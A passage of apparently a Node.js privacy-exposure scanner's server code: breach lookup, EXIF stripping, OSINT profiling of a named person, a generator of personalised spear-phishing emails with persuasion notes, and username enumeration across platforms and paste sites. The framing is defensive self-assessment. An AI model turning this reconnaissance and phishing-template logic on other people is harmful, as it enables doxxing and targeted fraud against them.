  dailymotion: { domain: "dailymotion.com", records: 85176234 },
  disqus: { domain: "disqus.com", records: 17551044 },
  gravatar: { domain: "gravatar.com", records: 167000000 },
  snapchat: { domain: "snapchat.com", records: 4600000 },
  netflix: { domain: "netflix.com", records: 0 },
  spotify: { domain: "spotify.com", records: 0 },
  github: { domain: "github.com", records: 0 },
  trello: { domain: "trello.com", records: 15000000 },
  dubsmash: { domain: "dubsmash.com", records: 161749950 },
  wishapp: { domain: "wish.com", records: 2428549 },
  zoosk: { domain: "zoosk.com", records: 30000000 },
  myspace: { domain: "myspace.com", records: 359420698 },
  "000webhost.com": { domain: "000webhost.com", records: 15251512 },
};

const FIELD_LABELS = {
  email: "Email Address",
  password: "Password",
  password_hash: "Password Hash",
  hash: "Password Hash",
  username: "Username",
  phone: "Phone Number",
  address: "Physical Address",
  ip: "IP Address",
  dob: "Date of Birth",
  name: "Full Name",
  ssn: "Social Security Number",
  cc: "Credit Card",
  uid: "User ID",
  login: "Login",
  country: "Country",
  city: "City",
  gender: "Gender",
  zip: "ZIP Code",
};

function getBreachSeverity(fields) {
  if (!fields || fields.length === 0) return "low";
  const f = fields.map((x) => x.toLowerCase());
  if (f.includes("password") || f.includes("cc") || f.includes("ssn")) return "critical";
  if (f.includes("password_hash") || f.includes("hash") || f.includes("dob")) return "high";
  if (f.includes("phone") || f.includes("address") || f.includes("name")) return "medium";
  return "low";
}

// email scan
app.post("/email-scan", async (req, res) => {
  try {
    const { email, mode } = req.body;

    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      return res.status(400).json({ error: "Valid email address is required" });
    }

    // ── Advanced (paid) mode ───────────────────────────────────────────────────
    if (mode === "advanced") {
      const apiKey = process.env.LEAKCHECK_API_KEY;
      if (!apiKey) {
        return res.status(400).json({ error: "Advanced scan is not configured." });
      }

      const { data: paidData } = await leakcheckGet(
        `https://leakcheck.io/api/v2/query/${encodeURIComponent(email)}`,
        { headers: { "X-API-Key": apiKey } }
      );

      if (!paidData.success) {
        return res.status(429).json({ error: paidData.error || "Paid API quota exceeded." });
      }

      const results = paidData.result || [];

      const fieldSet = new Set();
      results.forEach((entry) => {
        Object.keys(entry).forEach((k) => {
          if (k !== "source" && k !== "email") fieldSet.add(k);
        });
      });
      const rawFields = Array.from(fieldSet);

      return res.json({
        success: true,
        found: paidData.found || results.length,
        isPaid: true,
        quota: paidData.quota ?? null,
        paidResults: results,
        fields: rawFields,
        displayFields: rawFields.map((f) => FIELD_LABELS[f.toLowerCase()] || f),
      });
    }

    // ── Basic (free) mode ──────────────────────────────────────────────────────
    const { data: rawData } = await leakcheckGet(
      `https://leakcheck.io/api/public?check=${encodeURIComponent(email)}`
    );

    const severity = getBreachSeverity(rawData.fields);
    const displayFields = (rawData.fields || []).map(
      (f) => FIELD_LABELS[f.toLowerCase()] || f
    );
    const enrichedSources = (rawData.sources || []).map((source) => {
      const key = source.name.toLowerCase().replace(/[^a-z0-9.]/g, "");
      const meta = BREACH_META[key] || {};
      const domain =
        meta.domain !== undefined
          ? meta.domain
          : source.name.toLowerCase().replace(/\s+/g, "").replace(/[^a-z0-9.-]/g, "") + ".com";
      return {
        name: source.name,
        domain,
        date: source.date || null,
        records: meta.records != null ? meta.records : null,
        severity,
      };
    });

    res.json({
      success: rawData.success,
      found: rawData.found || 0,
      fields: rawData.fields || [],
      displayFields,
      severity,
      sources: enrichedSources,
      isPaid: false,
    });
  } catch (err) {
    console.error(err);
    const code = err.code || err.cause?.code;
    if (code === "ECONNABORTED" || code === "ETIMEDOUT" || code === "ENOTFOUND") {
      return res.status(503).json({ error: "Cannot reach the breach database. Check your internet connection and try again." });
    }
    res.status(500).json({ error: "Server error" });
  }
});

// ── EXIF Metadata Scanner ─────────────────────────────────────────────────────

function stripJpegMetadata(buf) {
  if (buf.length < 4 || buf[0] !== 0xFF || buf[1] !== 0xD8) return buf;
  const keep = [buf.slice(0, 2)]; // SOI
  let pos = 2;
  while (pos + 1 < buf.length) {
    if (buf[pos] !== 0xFF) break;
    const marker = buf[pos + 1];
    if (marker === 0xD9) { keep.push(buf.slice(pos, pos + 2)); break; } // EOI
    if (marker === 0x01 || (marker >= 0xD0 && marker <= 0xD7)) { keep.push(buf.slice(pos, pos + 2)); pos += 2; continue; } // TEM/RST
    if (marker === 0xDA) { keep.push(buf.slice(pos)); break; } // SOS + entropy data
    if (pos + 4 > buf.length) break;
    const segLen = buf.readUInt16BE(pos + 2);
    const segEnd = pos + 2 + segLen;
    // Drop: APP1 (EXIF/XMP), APP2-15 (ICC/etc), COM (comments)
    const drop = marker === 0xE1 || marker === 0xFE || (marker >= 0xE2 && marker <= 0xEF);
    if (!drop) keep.push(buf.slice(pos, segEnd));
    pos = segEnd;
  }
  return Buffer.concat(keep);
}

function stripPngMetadata(buf) {
  const SIG = Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]);
  if (buf.length < 8 || !buf.slice(0, 8).equals(SIG)) return buf;
  const KEEP = new Set(['IHDR', 'PLTE', 'IDAT', 'IEND', 'tRNS', 'pHYs', 'gAMA', 'cHRM', 'sRGB', 'sBIT', 'bKGD']);
  const out = [SIG];
  let pos = 8;
  while (pos + 12 <= buf.length) {
    const dataLen = buf.readUInt32BE(pos);
    const type = buf.slice(pos + 4, pos + 8).toString('ascii');
    const total = 12 + dataLen; // 4 len + 4 type + data + 4 CRC
    if (KEEP.has(type)) out.push(buf.slice(pos, pos + total));
    pos += total;
    if (type === 'IEND') break;
  }
  return Buffer.concat(out);
}

function computeMetadataRisk(ex) {
  let s = 0;
  if (ex.gps) { s += 50; if (ex.gps.altitude) s += 4; if (ex.gps.speed) s += 4; if (ex.gps.direction) s += 3; }
  if (ex.serialNumber) s += 18;
  if (ex.artist) s += 14;
  if (ex.copyright) s += 9;
  if (ex.description) s += 9;
  if (ex.make || ex.model) s += 6;
  if (ex.dateTaken) s += 5;
  if (ex.software) s += 3;
  return Math.min(s, 95);
}

function fmtShutter(t) {
  if (t == null) return null;
  if (t >= 1) return t + 's';
  return `1/${Math.round(1 / t)}s`;
}

function fmtExifDate(raw) {
  if (!raw) return null;
  const s = String(raw).replace(/^(\d{4}):(\d{2}):(\d{2})/, '$1-$2-$3');
  const d = new Date(s);
  if (isNaN(d.getTime())) return String(raw);
  return d.toLocaleString('en-US', { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' });
}

app.post("/scan-metadata", upload.single("image"), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: "No image uploaded" });
  const tmpFile = req.file.path;

  try {
    const { default: exifr } = await import("exifr");

    let rawExif = null;
    try {
      rawExif = await exifr.parse(tmpFile, {
        tiff: true, exif: true, gps: true, xmp: true, iptc: true,
        translateValues: true, reviveValues: false, mergeOutput: true,
      });
    } catch (e) {
      console.log("EXIF parse:", e.message);
    }

    const exif = rawExif || {};

    const extracted = {
      gps: exif.latitude != null && exif.longitude != null ? {
        latitude:  +exif.latitude.toFixed(6),
        longitude: +exif.longitude.toFixed(6),
        altitude:  exif.GPSAltitude  != null ? `${Math.round(exif.GPSAltitude)} m`          : null,
        direction: exif.GPSImgDirection != null ? `${Math.round(exif.GPSImgDirection)}°`    : null,
        speed:     exif.GPSSpeed     != null ? `${exif.GPSSpeed} ${exif.GPSSpeedRef || 'km/h'}` : null,
        mapUrl: `https://www.google.com/maps?q=${exif.latitude.toFixed(6)},${exif.longitude.toFixed(6)}`,
      } : null,

      make:         exif.Make   || null,
      model:        exif.Model  || null,
      lens:         exif.LensModel || exif.LensMake || null,
      serialNumber: exif.BodySerialNumber || exif.SerialNumber || exif.CameraSerialNumber || null,

      dateTaken:   fmtExifDate(exif.DateTimeOriginal || exif.CreateDate),
      dateModified: fmtExifDate(exif.ModifyDate || exif.DateTime),

      iso:           exif.ISO                                   || null,
      shutterSpeed:  fmtShutter(exif.ExposureTime),
      aperture:      exif.FNumber          ? `f/${exif.FNumber}`                     : null,
      focalLength:   exif.FocalLength      ? `${exif.FocalLength}mm`                 : null,
      focalLength35: exif.FocalLengthIn35mmFormat ? `${exif.FocalLengthIn35mmFormat}mm (35mm equiv.)` : null,
      flash:         exif.Flash       != null && exif.Flash !== '' ? String(exif.Flash)       : null,
      whiteBalance:  exif.WhiteBalance != null && exif.WhiteBalance !== '' ? String(exif.WhiteBalance) : null,
      exposureMode:  exif.ExposureMode != null && exif.ExposureMode !== '' ? String(exif.ExposureMode) : null,
      meteringMode:  exif.MeteringMode != null && exif.MeteringMode !== '' ? String(exif.MeteringMode) : null,
      exposureProgram: exif.ExposureProgram != null && exif.ExposureProgram !== '' ? String(exif.ExposureProgram) : null,

      artist:      exif.Artist          || null,
      copyright:   exif.Copyright       || null,
      description: exif.ImageDescription || exif.XPTitle || null,
      keywords:    Array.isArray(exif.Keywords) ? exif.Keywords.join(', ') : (exif.Keywords || null),

      width:      exif.ExifImageWidth  || exif.ImageWidth  || exif.PixelXDimension || null,
      height:     exif.ExifImageHeight || exif.ImageHeight || exif.PixelYDimension || null,
      colorSpace: exif.ColorSpace === 1 ? 'sRGB' : exif.ColorSpace === 65535 ? 'Uncalibrated' : null,
      orientation: exif.Orientation ? String(exif.Orientation) : null,
      software:   exif.Software || null,
      xResolution: exif.XResolution ? `${exif.XResolution} dpi` : null,
      yResolution: exif.YResolution ? `${exif.YResolution} dpi` : null,

      totalFields: rawExif ? Object.keys(rawExif).length : 0,
    };

    // Build sanitised raw-field map (printable scalars only, no huge binary blobs)
    const rawFields = {};
    if (rawExif) {
      for (const [k, v] of Object.entries(rawExif)) {
        if (v == null) continue;
        if (typeof v === 'number' || typeof v === 'boolean') { rawFields[k] = v; continue; }
        if (typeof v === 'object' && !(v instanceof Date) && !Array.isArray(v)) continue;
        const str = v instanceof Date ? v.toISOString() : Array.isArray(v) ? v.join(', ') : String(v);
        if (str.length <= 200) rawFields[k] = str;
      }
    }

    const riskScore = computeMetadataRisk(extracted);
    const riskLevel = riskScore >= 60 ? 'critical' : riskScore >= 35 ? 'high' : riskScore >= 15 ? 'medium' : 'low';

    const originalBuf = fs.readFileSync(tmpFile);
    const mime = req.file.mimetype;
    let cleanBuf;
    if (mime === 'image/jpeg') cleanBuf = stripJpegMetadata(originalBuf);
    else if (mime === 'image/png') cleanBuf = stripPngMetadata(originalBuf);
    else cleanBuf = originalBuf; // WebP/GIF returned as-is

    res.json({
      success: true,
      filename: req.file.originalname,
      fileSize: req.file.size,
      mimeType: mime,
      riskScore,
      riskLevel,
      extracted,
      rawFields,
      cleanImage: {
        base64:   cleanBuf.toString('base64'),
        mimeType: mime,
        size:     cleanBuf.length,
        filename: 'clean_' + (req.file.originalname || 'image.jpg'),
      },
    });
  } catch (err) {
    console.error("Metadata scan error:", err.message);
    res.status(500).json({ error: "Metadata scan failed. Please try again." });
  } finally {
    try { fs.unlinkSync(tmpFile); } catch {}
  }
});

// ── Phishing Vulnerability Profiler ──────────────────────────────────────────

function parseLinkedInTitle(title) {
  if (!title) return {};
  // "Name - Job Title at Company | LinkedIn"
  const m1 = title.match(/\s*[-–]\s*(.+?)\s+at\s+(.+?)\s*\|/i);
  if (m1) return { jobTitle: m1[1].trim(), employer: m1[2].trim() };
  // "Name - Company | LinkedIn"
  const m2 = title.match(/\s*[-–]\s*(.+?)\s*\|/i);
  if (m2) return { employer: m2[1].trim() };
  return {};
}

function extractLocationFromText(text) {
  if (!text) return null;
  // Matches "City, State" or "City, Country"
  const m = text.match(/\b([A-Z][a-zA-Z\s]{2,}),\s+([A-Z][a-zA-Z\s]{2,}?)(?=\s*[\.\n\d•])/);
  return m ? m[0].trim() : null;
}

function generatePhishingSimulation({ name, employer, jobTitle, location, email }) {
  const firstName = name.split(/\s+/)[0];
  const now = new Date();
  const timeStr = now.toLocaleString("en-US", { timeZone: "America/New_York", dateStyle: "short", timeStyle: "short" });

  if (employer) {
    const fakeDomain = employer.toLowerCase().replace(/[^a-z0-9]/g, "") + "-secure.com";
    return {
      type: "Corporate IT Impersonation",
      severity: "critical",
      channel: "Email",
      subject: `[ACTION REQUIRED] ${employer} IT Security - Verify Your Identity`,
      sender: `it-security@${fakeDomain}`,
      body: [
        `Dear ${firstName},`,
        ``,
        `Our Security Operations Center has detected an unauthorized login attempt on your`,
        `${employer} account${email ? ` (${email})` : ""}.`,
        ``,
        `Incident Details:`,
        `  Time:     ${timeStr} EST`,
        `  Location: Moscow, Russia`,
        `  Device:   Unknown - Windows 11 / Chrome 124`,
        `  Status:   Blocked (pending your review)`,
        ``,
        `As a${jobTitle ? ` ${jobTitle}` : " team member"} you have access to sensitive`,
        `${employer} systems. To protect company data${location ? ` and confirm you are in ${location}` : ""},`,
        `please verify your identity within the next 2 hours.`,
        ``,
        `  ► Secure Verification: https://verify.${fakeDomain}/auth`,
        ``,
        `Failure to verify will trigger an automatic account suspension and`,
        `escalation to your manager for review.`,
        ``,
        `IT Security Team`,
        `${employer} - Global Security Operations`,
        `This message was sent to: ${email || "[your address]"}`,
      ].join("\n"),
      whyEffective: [
        `Uses your real employer name ("${employer}") - looks 100% legitimate`,
        jobTitle ? `Addresses you by real job title ("${jobTitle}") - builds credibility` : null,
        location ? `Confirms your real location ("${location}") - makes foreign login alarming` : null,
        email ? `Sends to your known email - suggests the attacker has account data` : null,
        `2-hour deadline creates panic and prevents careful thinking`,
        `Threat of manager escalation exploits professional fear`,
      ].filter(Boolean),
    };
  }

  const fakeBankDomain = "alerts-secure-verify.com";
  return {
    type: "Financial Institution Impersonation",
    severity: "high",
    channel: "Email + SMS",
    subject: `Security Alert: Suspicious Transaction on Your Account`,
    sender: `no-reply@${fakeBankDomain}`,
    body: [
      `Dear ${firstName},`,
      ``,
      `A transaction of $2,847.00 was attempted on your account on ${now.toLocaleDateString("en-US")}.`,
      ``,
      `  Merchant:  Best Buy - Chicago, IL`,
      `  Time:      ${timeStr} EST`,
      `  Status:    Pending - flagged as unusual`,
      location ? `  Your Location: ${location} (mismatch detected)` : `  Pattern: Does not match your usual activity`,
      ``,
      `To confirm or dispute this charge and secure your account, review the transaction`,
      `within 24 hours:`,
      ``,
      `  ► https://secure.${fakeBankDomain}/review`,
      ``,
      `If you did authorize this charge, no action is needed.`,
      ``,
      `Fraud Prevention Team - Account Security`,
      `Reference: TXN-${Math.floor(Math.random() * 9000000 + 1000000)}`,
    ].join("\n"),
    whyEffective: [
      `Addresses you by real name ("${firstName}") for personal touch`,
      location ? `Flags location mismatch using your real city ("${location}") - makes attack believable` : null,
      email ? `Sent to your known email - implies the sender has your account data` : null,
      `Specific dollar amount and merchant add realism`,
      `24-hour deadline triggers impulsive action before thinking clearly`,
    ].filter(Boolean),
  };
}

app.post("/scan-phishing-profile", async (req, res) => {
  try {
    const { name, email, linkedin, location } = req.body;

    if (!name || name.trim().length < 2) {
      return res.status(400).json({ error: "Full name is required (at least 2 characters)" });
    }

    const findings = {
      name: name.trim(),
      email: email?.trim() || null,
      location: location?.trim() || null,
      linkedinUrl: linkedin?.trim() || null,
      jobTitle: null,
      employer: null,
      socialProfiles: [],
      publicMentions: 0,
      emailPubliclyFound: false,
    };

    // No API key - return demo simulation from input data only
    if (!SERPAPI_KEY) {
      let riskScore = 25;
      if (findings.email) riskScore += 20;
      if (findings.location) riskScore += 15;
      if (findings.linkedinUrl) riskScore += 20;
      riskScore = Math.min(riskScore, 95);

      return res.json({
        success: true,
        findings,
        riskScore,
        simulation: generatePhishingSimulation(findings),
        searchesPerformed: false,
      });
    }

    // Run OSINT searches in parallel via SerpAPI
    const queries = [
      `"${name.trim()}" site:linkedin.com`,
      `"${name.trim()}" site:twitter.com OR site:instagram.com OR site:facebook.com`,
      email
        ? `"${name.trim()}" "${email.trim()}"`
        : location
        ? `"${name.trim()}" "${location.trim()}"`
        : `"${name.trim()}" profile`,
    ];

    const results = await Promise.allSettled(
      queries.map((q) =>
        axios.get("https://serpapi.com/search", {
          params: { api_key: SERPAPI_KEY, engine: "google", q, num: 5 },
          timeout: 9000,
        })
      )
    );

    // Parse LinkedIn
    if (results[0].status === "fulfilled") {
      const organic = results[0].value.data?.organic_results || [];
      for (const r of organic) {
        if (r.link?.includes("linkedin.com/in/")) {
          const parsed = parseLinkedInTitle(r.title);
          if (parsed.jobTitle) findings.jobTitle = parsed.jobTitle;
          if (parsed.employer) findings.employer = parsed.employer;
          if (!findings.linkedinUrl) findings.linkedinUrl = r.link;
          const loc = extractLocationFromText(r.snippet);
          if (loc && !findings.location) findings.location = loc;
          break;
        }
      }
    }

    // Parse social profiles
    const SOCIAL_MAP = [
      { domain: "twitter.com", label: "Twitter/X" },
      { domain: "x.com", label: "Twitter/X" },
      { domain: "instagram.com", label: "Instagram" },
      { domain: "facebook.com", label: "Facebook" },
    ];
    if (results[1].status === "fulfilled") {
      const organic = results[1].value.data?.organic_results || [];
      for (const r of organic) {
        for (const p of SOCIAL_MAP) {
          if (r.link?.includes(p.domain) && !findings.socialProfiles.find((s) => s.platform === p.label)) {
            findings.socialProfiles.push({ platform: p.label, url: r.link });
          }
        }
      }
    }

    // Parse public mentions / email exposure
    if (results[2].status === "fulfilled") {
      const organic = results[2].value.data?.organic_results || [];
      findings.publicMentions = organic.length;
      if (email) {
        for (const r of organic) {
          if ((r.snippet || r.title || "").toLowerCase().includes(email.toLowerCase())) {
            findings.emailPubliclyFound = true;
            break;
          }
        }
      }
    }

    // Risk score
    let riskScore = 20;
    if (findings.linkedinUrl) riskScore += 18;
    if (findings.jobTitle) riskScore += 12;
    if (findings.employer) riskScore += 18;
    if (findings.location) riskScore += 10;
    if (findings.emailPubliclyFound) riskScore += 15;
    else if (email) riskScore += 8;
    riskScore += Math.min(findings.socialProfiles.length * 7, 14);
    if (findings.publicMentions > 3) riskScore += 8;
    riskScore = Math.min(riskScore, 95);

    res.json({
      success: true,
      findings,
      riskScore,
      simulation: generatePhishingSimulation(findings),
      searchesPerformed: true,
    });
  } catch (err) {
    console.error("Phishing profile scan error:", err.message);
    res.status(500).json({ error: "Scan failed. Please try again." });
  }
});

// ── Doxxing Vulnerability Scanner ─────────────────────────────────────────────

const DOXXING_PLATFORMS = [
  { id: "github",      name: "GitHub",        url: "https://github.com/{u}",                       check: "404", category: "Developer", riskWeight: 7  },
  { id: "gitlab",      name: "GitLab",        url: "https://gitlab.com/{u}",                       check: "404", category: "Developer", riskWeight: 5  },
  { id: "reddit",      name: "Reddit",        url: "https://www.reddit.com/user/{u}",              check: "404", category: "Forum",     riskWeight: 12 },
  { id: "devto",       name: "Dev.to",        url: "https://dev.to/{u}",                           check: "404", category: "Developer", riskWeight: 4  },
  { id: "keybase",     name: "Keybase",       url: "https://keybase.io/{u}",                       check: "404", category: "Identity",  riskWeight: 13 },
  { id: "medium",      name: "Medium",        url: "https://medium.com/@{u}",                      check: "404", category: "Writing",   riskWeight: 6  },
  { id: "npm",         name: "npm",           url: "https://www.npmjs.com/~{u}",                   check: "404", category: "Developer", riskWeight: 5  },
  { id: "flickr",      name: "Flickr",        url: "https://www.flickr.com/people/{u}",            check: "404", category: "Photos",    riskWeight: 9  },
  { id: "vimeo",       name: "Vimeo",         url: "https://vimeo.com/{u}",                        check: "404", category: "Video",     riskWeight: 5  },
  { id: "gravatar",    name: "Gravatar",      url: "https://en.gravatar.com/{u}",                  check: "404", category: "Identity",  riskWeight: 10 },
  { id: "venmo",       name: "Venmo",         url: "https://account.venmo.com/u/{u}",              check: "404", category: "Finance",   riskWeight: 16 },
  { id: "replit",      name: "Replit",        url: "https://replit.com/@{u}",                      check: "404", category: "Developer", riskWeight: 4  },
  { id: "codepen",     name: "CodePen",       url: "https://codepen.io/{u}",                       check: "404", category: "Developer", riskWeight: 4  },
  { id: "soundcloud",  name: "SoundCloud",    url: "https://soundcloud.com/{u}",                   check: "404", category: "Music",     riskWeight: 5  },
  { id: "producthunt", name: "Product Hunt",  url: "https://www.producthunt.com/@{u}",             check: "404", category: "Tech",      riskWeight: 4  },
  { id: "hackernews",  name: "Hacker News",   url: "https://news.ycombinator.com/user?id={u}",     check: "content_not", notFound: "No such user.", category: "Forum", riskWeight: 10 },
  { id: "pastebin",    name: "Pastebin",      url: "https://pastebin.com/u/{u}",                   check: "404", category: "Data",      riskWeight: 20 },
  { id: "cashapp",     name: "Cash App",      url: "https://cash.app/${u}",                        check: "404", category: "Finance",   riskWeight: 16 },
];

const BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";

async function checkPlatform(username, platform) {
  const url = platform.url.replace("{u}", encodeURIComponent(username));
  try {
    const resp = await axios.get(url, {
      headers: {
        "User-Agent": BROWSER_UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
      },
      timeout: 9000,
      validateStatus: () => true,
      maxRedirects: 4,
    });

    if (platform.check === "404") {
      if (resp.status === 429 || resp.status === 403) {
        return { id: platform.id, name: platform.name, category: platform.category, riskWeight: platform.riskWeight, status: "unknown", url };
      }
      return { id: platform.id, name: platform.name, category: platform.category, riskWeight: platform.riskWeight, status: resp.status === 200 ? "found" : "not_found", url };
    }

    if (platform.check === "content_not") {
      const body = (resp.data || "").toString();
      const notFound = body.includes(platform.notFound);
      return { id: platform.id, name: platform.name, category: platform.category, riskWeight: platform.riskWeight, status: (resp.status === 200 && !notFound) ? "found" : "not_found", url };
    }

    return { id: platform.id, name: platform.name, category: platform.category, riskWeight: platform.riskWeight, status: "unknown", url };
  } catch {
    return { id: platform.id, name: platform.name, category: platform.category, riskWeight: platform.riskWeight, status: "unknown", url };
  }
}

const PII_KEYWORDS = ["address", "phone", "email", "location", "born", "lives in", "works at", "home", "cell", "number", "street", "zip", "city", "employer", "married", "age"];

app.post("/scan-doxxing", async (req, res) => {
  try {
    const { username, email, fullName } = req.body;
    if (!username && !email) {
      return res.status(400).json({ error: "Username or email address is required." });
    }

    const scanTarget = username || email.split("@")[0];

    // ── Run all checks in parallel ─────────────────────────────────────────
    const [platformResults, serpData, emailData] = await Promise.all([
      // Platform checks
      username
        ? Promise.all(DOXXING_PLATFORMS.map(p => checkPlatform(username, p)))
        : Promise.resolve([]),

      // SerpAPI - search for username + email
      (async () => {
        if (!SERPAPI_KEY) return { organic: [], piiMentions: [], pasteResults: [] };
        try {
          const queries = [];

          if (username) {
            queries.push(
              axios.get("https://serpapi.com/search.json", {
                params: { engine: "google", q: `"${username}"`, num: 10, api_key: SERPAPI_KEY },
                timeout: 15000,
              })
            );
            queries.push(
              axios.get("https://serpapi.com/search.json", {
                params: { engine: "google", q: `site:pastebin.com "${username}"`, num: 5, api_key: SERPAPI_KEY },
                timeout: 12000,
              })
            );
          }
          if (email) {
            queries.push(
              axios.get("https://serpapi.com/search.json", {
                params: { engine: "google", q: `"${email}"`, num: 8, api_key: SERPAPI_KEY },
                timeout: 15000,
              })
            );
          }

          const results = await Promise.allSettled(queries);
          const organic = [];
          const pasteResults = [];

          for (const r of results) {
            if (r.status !== "fulfilled") continue;
            const items = r.value.data.organic_results || [];
            for (const item of items) {
              const url = item.link || "";
              if (url.includes("pastebin.com")) {
                pasteResults.push({ title: item.title, url, snippet: item.snippet || "" });
              } else {
                organic.push({ title: item.title, url, snippet: item.snippet || "", domain: (() => { try { return new URL(url).hostname.replace("www.", ""); } catch { return ""; } })() });
              }
            }
          }

          const piiMentions = organic.filter(r =>
            PII_KEYWORDS.some(k => (r.snippet || "").toLowerCase().includes(k) || (r.title || "").toLowerCase().includes(k))
          );

          return { organic, piiMentions, pasteResults };
        } catch {
          return { organic: [], piiMentions: [], pasteResults: [] };
        }
      })(),

      // Email breach check
      (async () => {
        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return null;
        try {
          const { data } = await leakcheckGet(`https://leakcheck.io/api/public?check=${encodeURIComponent(email)}`);
          return data;
        } catch { return null; }
      })(),
    ]);

    // ── Aggregate platform results ─────────────────────────────────────────
    const found   = platformResults.filter(p => p.status === "found");
    const unknown = platformResults.filter(p => p.status === "unknown");

    // Deduplicate organic results + cross-reference found platforms
    const serpDomains = new Set((serpData.organic || []).map(r => r.domain));
    const enrichedFound = found.map(p => ({
      ...p,
      confirmedBySerpAPI: serpDomains.has(p.id + ".com") || serpDomains.has(p.id + ".io") || serpDomains.has(p.id + ".tv"),
    }));

    // ── Risk Scoring ───────────────────────────────────────────────────────
    let riskScore = 10;

    // Platform presence
    for (const p of found) riskScore += p.riskWeight;

    // Bonus for many platforms
    if (found.length >= 8) riskScore += 12;
    else if (found.length >= 5) riskScore += 7;

    // Web mentions
    const mentionCount = (serpData.organic || []).length;
    riskScore += Math.min(mentionCount * 2, 18);

    // PII in web results
    const piiCount = (serpData.piiMentions || []).length;
    riskScore += Math.min(piiCount * 6, 24);

    // Paste sites
    if ((serpData.pasteResults || []).length > 0) riskScore += 22;

    // Email breach
    if (emailData?.found > 0) {
      const hasCredentials = (emailData.fields || []).some(f => ["password", "password_hash", "hash"].includes(f));
      const hasPII = (emailData.fields || []).some(f => ["phone", "address", "name", "dob", "ssn"].includes(f));
      riskScore += hasCredentials ? 18 : 10;
      if (hasPII) riskScore += 12;
    }

    riskScore = Math.min(riskScore, 97);

    // ── Attacker Timeline ──────────────────────────────────────────────────
    const attackerTimeline = [
      {
        phase: "0–3 min",
        action: "Google & Search Engine Reconnaissance",
        icon: "search",
        risk: mentionCount > 5 ? "high" : mentionCount > 0 ? "medium" : "low",
        findings: mentionCount > 0
          ? `"${scanTarget}" appears on ${mentionCount} indexed pages. Profiles on ${[...new Set((serpData.organic||[]).map(r=>r.domain))].slice(0,3).join(", ")} are visible without logging in.`
          : `Limited publicly indexed presence for "${scanTarget}".`,
        items: (serpData.organic || []).slice(0, 3).map(r => r.title).filter(Boolean),
      },
      {
        phase: "3–7 min",
        action: "Platform & Account Enumeration",
        icon: "users",
        risk: found.length >= 6 ? "high" : found.length >= 3 ? "medium" : "low",
        findings: found.length > 0
          ? `Username confirmed on ${found.length} platform${found.length > 1 ? "s" : ""}: ${found.map(p => p.name).join(", ")}.${found.some(p => p.category === "Finance") ? " Payment profiles expose real identity." : ""}`
          : `Username not found on checked platforms.`,
        items: found.slice(0, 5).map(p => `${p.name} - ${p.url}`),
      },
      {
        phase: "7–10 min",
        action: "Forum History & Content Mining",
        icon: "message",
        risk: (serpData.piiMentions||[]).length > 0 ? "high" : found.some(p => ["reddit", "hackernews"].includes(p.id)) ? "medium" : "low",
        findings: (serpData.piiMentions||[]).length > 0
          ? `${(serpData.piiMentions).length} web result${(serpData.piiMentions).length > 1 ? "s" : ""} contain personal information like location, employer, or contact details in public posts.`
          : found.some(p => ["reddit","hackernews"].includes(p.id))
            ? "Active forum accounts found. Post history can reveal location, employment, and personal details over time."
            : "No forum activity detected on checked platforms.",
        items: (serpData.piiMentions||[]).slice(0,3).map(r => `${r.domain}: "${r.snippet?.slice(0,80)}…"`),
      },
      {
        phase: "10–13 min",
        action: "Breach Database & Credential Lookup",
        icon: "database",
        risk: emailData?.found > 0 ? (emailData.found > 3 ? "high" : "medium") : "low",
        findings: email
          ? emailData?.found > 0
            ? `Email found in ${emailData.found} breach${emailData.found > 1 ? "es" : ""}. Exposed: ${(emailData.fields||[]).slice(0,4).join(", ")}. Credentials may be circulating on dark web marketplaces.`
            : "Email not found in checked breach databases."
          : "No email provided - breach lookup skipped. Attackers often find email from profile bios.",
        items: emailData?.found > 0 ? [(emailData.sources||[]).slice(0,3).map(s=>s.name).join(", ")].filter(Boolean) : [],
      },
      {
        phase: "13–15 min",
        action: "Data Broker Cross-Reference & Pastebin",
        icon: "warning",
        risk: (serpData.pasteResults||[]).length > 0 ? "high" : riskScore > 50 ? "medium" : "low",
        findings: (serpData.pasteResults||[]).length > 0
          ? `Username appears in ${(serpData.pasteResults).length} Pastebin document${(serpData.pasteResults).length>1?"s":""}. These often contain dumped data, doxx files, or credential lists.`
          : `Based on ${found.length} confirmed profiles, data broker sites (Spokeo, BeenVerified, WhitePages) would surface a full address and phone number for $2–5.`,
        items: (serpData.pasteResults||[]).slice(0,3).map(r => r.title),
      },
    ];

    // ── Exposure categories ────────────────────────────────────────────────
    const exposureCategories = [
      { label: "Social Footprint",   value: Math.min(found.filter(p => ["Forum","Social","Writing"].includes(p.category)).length * 20, 100) },
      { label: "Developer Identity", value: Math.min(found.filter(p => p.category === "Developer").length * 25, 100) },
      { label: "Financial Exposure", value: found.some(p => p.category === "Finance") ? 90 : 10 },
      { label: "Content & Media",    value: Math.min(found.filter(p => ["Photos","Video","Music"].includes(p.category)).length * 30, 100) },
      { label: "Breach Risk",        value: emailData?.found > 0 ? Math.min(emailData.found * 20 + 20, 100) : 5 },
      { label: "Paste / Leak Sites", value: (serpData.pasteResults||[]).length > 0 ? 90 : 5 },
    ];

    res.json({
      success: true,
      scanTarget,
      username: username || null,
      email: email || null,
      platforms: enrichedFound,
      notFound: platformResults.filter(p => p.status === "not_found").map(p => ({ id: p.id, name: p.name, category: p.category })),
      unknownPlatforms: unknown.length,
      webMentions: (serpData.organic || []).slice(0, 8),
      piiMentions: (serpData.piiMentions || []).slice(0, 5),
      pasteResults: (serpData.pasteResults || []).slice(0, 5),
      emailBreach: emailData ? {
        found: emailData.found || 0,
        fields: emailData.fields || [],
        sources: (emailData.sources || []).slice(0, 4).map(s => s.name),
      } : null,
      riskScore,
      attackerTimeline,
      exposureCategories,
      totalPlatformsChecked: platformResults.length,
      serpAPIUsed: !!SERPAPI_KEY,
    });
  } catch (err) {
    console.error("Doxxing scan error:", err.message);
    res.status(500).json({ error: "Scan failed. Please try again." });
  }
});

// ── PII Exposure Score ────────────────────────────────────────────────────────
